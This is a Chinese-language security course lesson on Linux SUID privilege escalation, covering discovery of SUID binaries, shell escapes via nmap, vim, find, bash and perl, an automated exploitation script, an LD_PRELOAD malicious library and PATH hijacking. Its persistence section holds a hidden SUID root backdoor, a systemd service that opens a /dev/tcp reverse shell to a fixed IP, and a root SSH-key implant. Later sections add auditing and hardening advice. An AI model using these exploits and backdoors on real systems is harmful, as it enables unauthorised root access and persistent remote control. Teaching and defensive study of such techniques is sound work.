# 课时02 SUID提权

## 一、课程目标

本节课主要学习Linux系统中利用SUID权限进行提权的技术和方法。SUID提权是Linux系统中最常见也是最容易被忽视的提权方式之一。通过本课的学习，你将能够：

1. 理解SUID权限的工作原理和安全风险
2. 掌握查找和利用SUID文件进行提权的方法
3. 学会使用常见的SUID提权工具和技术
4. 了解SUID提权的防护措施和检测方法
5. 熟悉GTFOBins等SUID利用资源

## 二、名词解释表

| 名词 | 解释 |
|------|------|
| SUID | Set User ID，设置用户ID位 |
| SGID | Set Group ID，设置组ID位 |
| Sticky Bit | 粘滞位，用于目录权限控制 |
| GTFOBins | Get The F*** Out_bins，SUID/SGID二进制文件利用数据库 |
| 权限提升 | 从低权限用户提升到高权限用户 |
| 二进制文件 | 可执行的机器码程序 |
| 符号链接 | 软链接，指向另一个文件的快捷方式 |

## 三、技术原理

### 3.1 SUID权限概述

SUID（Set User ID upon execution）是Linux文件系统中的一种特殊权限位。当一个文件设置了SUID位时，任何用户执行该文件都会以文件所有者的权限运行。

#### SUID工作原理
1. 普通用户执行SUID文件
2. 系统临时将执行用户的Effective UID设置为文件所有者UID
3. 文件以文件所有者权限执行
4. 执行完毕后恢复原用户权限

#### SUID权限表示
```bash
# SUID权限显示
-rwsr-xr-x 1 root root 123456 date file_with_suid
# 注意s字母表示SUID已设置
```

### 3.2 SUID安全风险

#### 风险来源
1. **系统自带SUID文件**：如passwd、sudo等
2. **第三方软件SUID文件**：如nmap、vim等
3. **自定义SUID文件**：管理员不当设置

#### 典型风险场景
- SUID文件存在缓冲区溢出漏洞
- SUID文件可以执行任意命令
- SUID文件可以读取敏感文件

### 3.3 提权原理

#### 利用条件
1. 目标系统存在可利用的SUID文件
2. SUID文件所有者为root或高权限用户
3. SUID文件具有可利用的功能

#### 提权过程
1. 查找系统中的SUID文件
2. 分析SUID文件的功能特性
3. 利用SUID文件获得高权限shell
4. 验证权限提升结果

## 四、SUID文件查找

### 4.1 基础查找命令

#### 查找所有SUID文件
```bash
# 查找系统中所有SUID文件
find / -perm -4000 2>/dev/null

# 详细信息显示
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# 按修改时间排序
find / -perm -4000 -exec ls -ld {} \; 2>/dev/null | sort -k6
```

#### 查找SGID文件
```bash
# 查找SGID文件
find / -perm -2000 2>/dev/null

# 同时查找SUID和SGID文件
find / -perm -6000 2>/dev/null
```

### 4.2 高级查找技巧

#### 按用户查找
```bash
# 查找root用户的SUID文件
find / -user root -perm -4000 2>/dev/null

# 查找特定组的SUID文件
find / -group root -perm -4000 2>/dev/null
```

#### 按时间查找
```bash
# 查找最近修改的SUID文件
find / -perm -4000 -mtime -7 2>/dev/null

# 查找特定时间段内的SUID文件
find / -perm -4000 -newer /tmp/reference_file 2>/dev/null
```

### 4.3 自定义查找脚本

```bash
#!/bin/bash
# suid_finder.sh - SUID文件查找脚本

echo "=== SUID文件查找工具 ==="
echo "开始时间: $(date)"

# 查找SUID文件
echo "正在查找SUID文件..."
find / -type f -perm -4000 2>/dev/null | while read file; do
    ls -ldb "$file"
done > /tmp/suid_files.txt

# 查找SGID文件
echo "正在查找SGID文件..."
find / -type f -perm -2000 2>/dev/null | while read file; do
    ls -ldb "$file"
done > /tmp/sgid_files.txt

# 统计结果
suid_count=$(wc -l < /tmp/suid_files.txt)
sgid_count=$(wc -l < /tmp/sgid_files.txt)

echo "发现 $suid_count 个SUID文件"
echo "发现 $sgid_count 个SGID文件"
echo "结果保存在 /tmp/suid_files.txt 和 /tmp/sgid_files.txt"

# 显示前10个SUID文件
echo "=== 前10个SUID文件 ==="
head -10 /tmp/suid_files.txt
```

## 五、常见可利用SUID文件

### 5.1 nmap

#### 漏洞原理
nmap的interactive模式可以执行shell命令。

#### 利用方法
```bash
# 检查nmap SUID权限
ls -l $(which nmap)

# 利用nmap提权
nmap --interactive
nmap> !sh
# 获得root shell
```

#### 替代利用方法
```bash
# 使用--script参数
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
nmap --script=$TF
```

### 5.2 vim

#### 漏洞原理
vim可以执行shell命令。

#### 利用方法
```bash
# 直接执行shell
vim -c ':!/bin/sh'

# 或者在vim中执行
vim
:!sh
```

### 5.3 find

#### 漏洞原理
find命令可以执行任意命令。

#### 利用方法
```bash
# 使用-exec参数
find . -exec /bin/sh \; -quit

# 或者
find . -exec /bin/bash -p \; -quit
```

### 5.4 bash

#### 漏洞原理
bash的-p参数可以保持SUID权限。

#### 利用方法
```bash
# 使用-p参数启动bash
bash -p

# 验证权限
id
# 应该显示root权限
```

## 六、自动化提权工具

### 6.1 SUID提权脚本

```bash
#!/bin/bash
# suid_exploiter.sh - SUID提权自动化脚本

echo "=== SUID提权检测工具 ==="

# 定义已知可利用的SUID文件列表
VULNERABLE_SUID=(
    "/usr/bin/nmap"
    "/usr/bin/vim"
    "/usr/bin/find"
    "/bin/bash"
    "/usr/bin/perl"
    "/usr/bin/python"
    "/usr/bin/awk"
    "/usr/bin/man"
)

# 检查每个可利用文件
for suid_file in "${VULNERABLE_SUID[@]}"; do
    if [ -u "$suid_file" ]; then
        echo "[+] 发现可利用SUID文件: $suid_file"
        
        # 根据文件类型执行相应利用
        case "$suid_file" in
            "/usr/bin/nmap")
                echo "    尝试nmap提权..."
                timeout 5 $suid_file --interactive 2>/dev/null &
                ;;
            "/usr/bin/vim")
                echo "    尝试vim提权..."
                timeout 5 $suid_file -c ':!/bin/sh' 2>/dev/null &
                ;;
            "/usr/bin/find")
                echo "    尝试find提权..."
                timeout 5 $suid_file . -exec /bin/sh \; -quit 2>/dev/null &
                ;;
            "/bin/bash")
                echo "    尝试bash提权..."
                timeout 5 $suid_file -p 2>/dev/null &
                ;;
        esac
    fi
done

echo "检测完成。"
```

### 6.2 GTFOBins利用

#### GTFOBins简介
GTFOBins是一个社区维护的SUID/SGID二进制文件利用数据库。

#### 使用方法
```bash
# 访问GTFOBins网站
# https://gtfobins.github.io/

# 查找特定二进制文件的利用方法
# 例如搜索bash、find、vim等

# 命令行查询示例
curl -s https://gtfobins.github.io/gtfobins/bash/ | grep -A 10 "SUID"
```

#### 本地查询脚本
```bash
#!/bin/bash
# gtfobins_checker.sh - 本地GTFOBins查询

check_suid_exploit() {
    local binary=$1
    echo "检查 $binary 的SUID利用方法:"
    
    case $binary in
        "bash")
            echo "  bash -p"
            ;;
        "find")
            echo "  find . -exec /bin/sh -p \\; -quit"
            ;;
        "vim")
            echo "  vim -c ':shell'"
            ;;
        "nmap")
            echo "  nmap --interactive"
            echo "  或: echo 'os.execute(\"/bin/sh\")' > /tmp/exploit.nse && nmap --script=/tmp/exploit.nse"
            ;;
        "perl")
            echo "  perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
            ;;
        *)
            echo "  请查询 https://gtfobins.github.io/ 获取利用方法"
            ;;
    esac
    echo ""
}

# 检查常见SUID文件
COMMON_SUID_BINARIES=("bash" "find" "vim" "nmap" "perl" "python" "awk" "man")
for binary in "${COMMON_SUID_BINARIES[@]}"; do
    if command -v $binary &> /dev/null; then
        if [ -u "$(which $binary)" ]; then
            check_suid_exploit $binary
        fi
    fi
done
```

## 七、手工利用技术

### 7.1 环境变量利用

#### LD_PRELOAD利用
```bash
# 创建恶意共享库
cat > /tmp/malicious.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# 编译共享库
gcc -fPIC -shared -o /tmp/malicious.so /tmp/malicious.c -nostartfiles

# 利用SUID程序加载恶意库
sudo LD_PRELOAD=/tmp/malicious.so apache2
```

### 7.2 符号链接攻击

#### 攻击原理
利用符号链接绕过文件权限检查。

```bash
# 创建符号链接
ln -s /etc/passwd /tmp/symlink

# 如果某个SUID程序会写入/tmp/symlink
# 则可能修改/etc/passwd文件
```

### 7.3 路径劫持

#### 攻击原理
通过修改PATH环境变量劫持命令执行。

```bash
# 创建恶意程序
cat > /tmp/sh << 'EOF'
#!/bin/bash
/bin/bash -p
EOF

# 添加执行权限
chmod +x /tmp/sh

# 修改PATH
export PATH=/tmp:$PATH

# 执行SUID程序（如果它会调用sh命令）
# 可能会执行我们的恶意sh程序
```

## 八、权限维持

### 8.1 SUID后门

#### 创建SUID后门
```bash
# 创建后门程序
cat > /tmp/backdoor.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

# 编译并设置SUID
gcc /tmp/backdoor.c -o /tmp/backdoor
chmod u+s /tmp/backdoor

# 隐藏后门文件
mv /tmp/backdoor /usr/local/bin/.hidden_backdoor
```

#### 使用后门
```bash
# 执行后门获得root权限
/usr/local/bin/.hidden_backdoor
```

### 8.2 系统服务后门

#### systemd服务后门
```bash
# 创建systemd服务文件
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; sleep 3600; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# 启用服务
systemctl enable backdoor.service
systemctl start backdoor.service
```

## 九、防护措施

### 9.1 SUID文件审计

#### 定期审计脚本
```bash
#!/bin/bash
# suid_auditor.sh - SUID文件审计工具

echo "=== SUID文件安全审计 ==="
echo "审计时间: $(date)"

# 定义标准SUID文件列表
STANDARD_SUID=(
    "/usr/bin/passwd"
    "/usr/bin/su"
    "/usr/bin/sudo"
    "/usr/bin/chsh"
    "/usr/bin/chfn"
    "/usr/bin/gpasswd"
    "/usr/bin/newgrp"
    "/usr/bin/mount"
    "/usr/bin/umount"
    "/usr/bin/pkexec"
)

# 查找所有SUID文件
ALL_SUID=$(find / -type f -perm -4000 2>/dev/null)

echo "发现的SUID文件:"
for file in $ALL_SUID; do
    # 检查是否为标准SUID文件
    is_standard=0
    for standard in "${STANDARD_SUID[@]}"; do
        if [ "$file" = "$standard" ]; then
            is_standard=1
            break
        fi
    done
    
    if [ $is_standard -eq 0 ]; then
        echo "[警告] 非标准SUID文件: $file"
        ls -ldb "$file"
    fi
done
```

### 9.2 系统加固

#### 禁用不必要的SUID
```bash
# 移除非必要的SUID权限
chmod u-s /usr/bin/nmap
chmod u-s /usr/bin/vim.basic

# 或者完全移除不需要的程序
# apt remove nmap vim
```

#### 文件系统监控
```bash
# 使用auditd监控SUID文件变更
echo "-w /usr/bin -p wa -k suid_binaries" >> /etc/audit/rules.d/suid.rules
echo "-w /bin -p wa -k suid_binaries" >> /etc/audit/rules.d/suid.rules

# 重启auditd服务
systemctl restart auditd
```

### 9.3 安全配置

#### 限制SUID使用
```bash
# 在/etc/fstab中添加nosuid选项
# /dev/sda1 /home ext4 defaults,nosuid 0 2

# 或者使用mount选项
mount -o remount,nosuid /home
```

#### 用户权限管理
```bash
# 限制用户执行权限
# 在/etc/security/limits.conf中添加
# username hard nproc 10
# username hard nofile 100
```

## 十、实战案例

### 10.1 SUID提权完整流程

#### 信息收集阶段
```bash
# 1. 查找SUID文件
find / -perm -4000 2>/dev/null

# 2. 分析文件权限
ls -ldb /usr/bin/nmap /usr/bin/vim /usr/bin/find

# 3. 检查文件版本
nmap --version
vim --version
```

#### 利用阶段
```bash
# 4. 尝试nmap提权
nmap --interactive
nmap> !sh

# 5. 验证权限
id
whoami
# 应该显示root权限

# 6. 维持访问
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
```

### 10.2 复杂环境提权

#### 多层利用
```bash
# 1. 发现多个SUID文件
find / -perm -4000 2>/dev/null | head -5

# 2. 逐个测试利用可能性
for suid in $(find / -perm -4000 2>/dev/null | head -5); do
    echo "测试: $suid"
    timeout 3 $suid --help 2>/dev/null | head -3
done

# 3. 选择最合适的利用方法
# 例如使用perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

## 十一、故障排除

### 11.1 常见问题

#### SUID权限未生效
```bash
# 检查文件系统是否支持SUID
mount | grep nosuid

# 检查文件权限
ls -l /path/to/file

# 重新设置SUID权限
chmod u+s /path/to/file
```

#### 利用失败
```bash
# 检查SELinux状态
getenforce

# 临时禁用SELinux
setenforce 0

# 检查AppArmor配置
aa-status
```

### 11.2 权限验证

#### 验证提权成功
```bash
# 检查当前权限
id
uid=0(root) gid=1000(user) groups=1000(user)

# 检查环境变量
env | grep -E "(USER|HOME|SHELL)"

# 测试特权操作
cat /etc/shadow
touch /root/test_file
```

## 十二、课后作业

1. **基础练习**：
   - 在实验环境中设置多个SUID文件
   - 练习使用不同方法进行SUID提权
   - 验证提权结果并清理环境
   - 使用GTFOBins查询利用方法

2. **进阶练习**：
   - 编写自定义SUID利用脚本
   - 实现SUID文件审计工具
   - 配置系统防护措施
   - 研究新的SUID利用技术

3. **思考题**：
   - SUID提权相比其他提权方法的优势和劣势是什么？
   - 如何平衡系统功能需求和安全性？
   - 现代Linux发行版如何减少SUID提权风险？

4. **扩展阅读**：
   - 研究GTFOBins项目源码
   - 了解SELinux/AppArmor对SUID的限制
   - 学习容器环境中的权限管理